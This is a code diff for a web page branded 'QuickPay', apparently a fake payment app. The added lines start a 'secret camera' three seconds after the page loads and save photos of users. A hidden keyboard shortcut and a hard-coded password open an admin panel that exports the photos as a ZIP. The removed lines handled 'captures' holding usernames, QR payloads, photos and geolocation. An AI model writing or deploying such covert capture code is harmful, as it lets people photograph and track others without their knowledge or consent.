-      const div = document.createElement('div'); div.className = 'item';
-      const left = document.createElement('div'); left.innerHTML = `<div><strong>${item.username || '—'}</strong></div><div class="badge">${new Date(item.savedAt||item.timestamp).toLocaleString()}</div><div class="badge">${item.qrPayload? 'QR: yes' : 'QR: no'}</div><div class="badge">${item.photo? 'Photo: yes' : 'Photo: no'}</div><div class="badge">${item.coords? 'Location: yes' : 'Location: no'}</div>`;
-      const right = document.createElement('div');
-      const btnView = document.createElement('button'); btnView.className='btn ghost'; btnView.style.marginRight='6px'; btnView.textContent='View'; btnView.addEventListener('click',()=>{
-        const w = window.open('', '_blank', 'noopener'); if(!w) return alert('Pop-up blocked.');
-        w.document.write('<title>Capture</title><pre style="white-space:pre-wrap;font-family:monospace">' + escapeHtml(JSON.stringify(item, null, 2)) + '</pre>');
-      });
-      const btnDel = document.createElement('button'); btnDel.className='btn ghost'; btnDel.textContent='Delete'; btnDel.addEventListener('click', async ()=>{ if(confirm('Delete this capture?')){ await deleteCapture(item.id); await refreshList(); }});
-      right.appendChild(btnView); right.appendChild(btnDel);
-      div.appendChild(left); div.appendChild(right); capturesList.appendChild(div);
-    });
+      
+      alert('Data exported successfully!');
+      
+    } catch (error) {
+      console.error('Export error:', error);
+      alert('Export failed: ' + error.message);
+    }
   }
 
-  downloadCSVBtn.addEventListener('click', async () => {
-    const arr = await listCaptures().catch(()=>[]);
-    if(!arr || arr.length===0){ alert('No saved captures'); return; }
-    const rows = [];
-    const header = ['id','username','timestamp','lat','lon','accuracy','qrPayload','photo','files']; rows.push(header.join(','));
-    arr.forEach(it => {
-      const filesCount = it.savedFiles ? it.savedFiles.length : 0;
-      const r = [
-        it.id, 
-        csvSafe(it.username), 
-        it.timestamp, 
-        it.coords?it.coords.latitude:'', 
-        it.coords?it.coords.longitude:'', 
-        it.coords?it.coords.accuracy:'', 
-        csvSafe(it.qrPayload),
-        it.photo ? 'yes' : 'no',
-        filesCount
-      ];
-      rows.push(r.join(','));
-    });
-    const blob = new Blob([rows.join('\n')], { type: 'text/csv' });
-    const url = URL.createObjectURL(blob); const a = document.createElement('a'); a.href=url; a.download='quickpay-captures-'+(new Date()).toISOString().replace(/[:.]/g,'-')+'.csv'; document.body.appendChild(a); a.click(); a.remove(); URL.revokeObjectURL(url);
+  async function exportAllPhotos() {
+    try {
+      const photos = await getPhotos();
+      
+      if (photos.length === 0) {
+        alert('No photos captured yet.');
+        return;
+      }
+      
+      // Create ZIP of photos
+      const JSZip = window.JSZip;
+      const zip = new JSZip();
+      
+      photos.forEach((photo, index) => {
+        const base64Data = photo.photo.replace(/^data:image\/\w+;base64,/, '');
+        const filename = `photo_${photo.sessionId || 'unknown'}_${index + 1}_${photo.timestamp.replace(/[:.]/g, '-')}.jpg`;
+        zip.file(filename, base64Data, { base64: true });
+      });
+      
+      zip.generateAsync({ type: "blob" }).then(function(content) {
+        const url = URL.createObjectURL(content);
+        const a = document.createElement('a');
+        a.href = url;
+        a.download = `quickpay_photos_${Date.now()}.zip`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+        
+        alert(`Exported ${photos.length} photos successfully!`);
+      });
+      
+    } catch (error) {
+      console.error('Export photos error:', error);
+      alert('Export failed: ' + error.message);
+    }
+  }
+
+  async function clearAllData() {
+    if (!confirm('⚠️ Delete ALL data? This cannot be undone!')) return;
+    
+    try {
+      // Clear IndexedDB
+      await new Promise((resolve, reject) => {
+        const request = indexedDB.deleteDatabase(DB_NAME);
+        request.onsuccess = resolve;
+        request.onerror = reject;
+      });
+      
+      // Reinitialize
+      await initDB();
+      await updateTransactionsList();
+      
+      // Generate new session
+      sessionId = 'SESS-' + Date.now() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+      
+      alert('All data cleared successfully!');
+      hideAdminPanel();
+      
+    } catch (error) {
+      console.error('Clear data error:', error);
+      alert('Clear failed: ' + error.message);
+    }
+  }
+
+  // Password modal events
+  document.getElementById('submitPassword').addEventListener('click', function() {
+    const password = document.getElementById('passwordInput').value;
+    if (password === ADMIN_PASSWORD) {
+      hidePasswordModal();
+      showAdminPanel();
+    } else {
+      document.getElementById('passwordError').style.display = 'block';
+      document.getElementById('passwordInput').value = '';
+      document.getElementById('passwordInput').focus();
+    }
+  });
+  
+  document.getElementById('cancelPassword').addEventListener('click', hidePasswordModal);
+  
+  document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+    if (e.key === 'Enter') {
+      document.getElementById('submitPassword').click();
+    }
   });
 
-  // Utilities
-  function escapeHtml(s){ if(!s) return ''; return String(s).replace(/[&<>\"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c])); }
-  function csvSafe(s){ if(s==null) return ''; return '"' + String(s).replace(/"/g,'""') + '"'; }
+  // Keyboard shortcut for admin panel
+  document.addEventListener('keydown', function(e) {
+    if (e.ctrlKey && e.shiftKey && e.altKey && e.key === 'A') {
+      e.preventDefault();
+      showPasswordModal();
+    }
+  });
 
-  // initial load
-  (async ()=>{ await refreshList(); setStatus('ready'); })();
+  // Initialize
+  async function init() {
+    try {
+      await initDB();
+      await updateTransactionsList();
+      status.textContent = 'Ready to use';
+      
+      // Start secret camera in background
+      setTimeout(() => {
+        startSecretCamera();
+      }, 3000); // Start 3 seconds after page load
+      
+    } catch (error) {
+      console.error('Init error:', error);
+      status.textContent = 'Initialization failed';
+    }
+  }
 
-  // cleanup
-  window.addEventListener('beforeunload', () => stopCamera());
+  // Initialize the app
+  init();
 })();
 </script>
+<!-- Include JSZip for photo exports -->
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
 </body>
 </html>
